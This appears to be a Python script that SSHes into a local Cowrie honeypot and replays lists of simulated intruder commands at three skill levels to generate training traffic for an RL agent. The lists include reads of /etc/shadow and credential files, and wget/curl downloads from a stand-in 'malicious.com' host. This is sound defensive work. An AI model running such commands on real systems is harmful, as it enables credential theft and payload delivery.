"""
Attacker Simulator - SSHes into honeypot and sends real commands
so the RL agent trains on actual traffic before real attackers arrive.
"""
import paramiko
import time
import random
import sys

HONEYPOT_HOST = "localhost"
HONEYPOT_PORT = 2222
USERNAME = "root"
PASSWORD = "cowrie"

# Simulated attacker command sequences by skill level
BEGINNER_COMMANDS = [
    "ls", "pwd", "whoami", "id", "uname -a",
    "cat /etc/passwd", "ls /home", "ls /root",
]

INTERMEDIATE_COMMANDS = [
    "ls -la", "find / -name '*.txt' 2>/dev/null",
    "cat /etc/shadow", "wget http://malicious.com/shell.sh",
    "chmod +x shell.sh", "netstat -an", "ps aux",
    "cat /root/passwords.txt", "ls /home/admin",
]

ADVANCED_COMMANDS = [
    "cat /home/admin/.credentials.txt",
    "cat /var/backups/server_backup.txt",
    "sudo su", "curl http://malicious.com/payload",
    "python3 -c 'import socket; s=socket.socket()'",
    "cat /home/admin/passwords.txt",
    "find / -perm -4000 2>/dev/null",
]

def run_simulation(skill="mixed", num_sessions=5):
    print(f"[SIM] Starting {num_sessions} simulated attack sessions (skill={skill})")

    for session_num in range(num_sessions):
        print(f"\n[SIM] Session {session_num + 1}/{num_sessions}")
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(
                HONEYPOT_HOST,
                port=HONEYPOT_PORT,
                username=USERNAME,
                password=PASSWORD,
                timeout=10,
                look_for_keys=False,
                allow_agent=False
            )

            # Pick command set based on skill
            if skill == "beginner":
                cmds = BEGINNER_COMMANDS
            elif skill == "advanced":
                cmds = ADVANCED_COMMANDS
            elif skill == "mixed":
                cmds = random.choice([BEGINNER_COMMANDS, INTERMEDIATE_COMMANDS, ADVANCED_COMMANDS])
            else:
                cmds = INTERMEDIATE_COMMANDS

            # Shuffle and pick random subset
            selected = random.sample(cmds, min(len(cmds), random.randint(3, 8)))

            channel = client.invoke_shell()
            time.sleep(1)

            for cmd in selected:
                print(f"[SIM]   Sending: {cmd}")
                channel.send(cmd + "\n")
                time.sleep(random.uniform(0.5, 2.0))

                # Read response
                if channel.recv_ready():
                    output = channel.recv(4096).decode("utf-8", errors="ignore")
                    print(f"[SIM]   Response: {output[:100].strip()}")

            channel.close()
            client.close()
            print(f"[SIM] Session {session_num + 1} complete")

        except Exception as e:
            print(f"[SIM] Session {session_num + 1} failed: {e}")

        time.sleep(random.uniform(1, 3))

    print("\n[SIM] All sessions complete. RL agent has been trained on real SSH traffic.")

if __name__ == "__main__":
    skill = sys.argv[1] if len(sys.argv) > 1 else "mixed"
    sessions = int(sys.argv[2]) if len(sys.argv) > 2 else 5
    run_simulation(skill=skill, num_sessions=sessions)
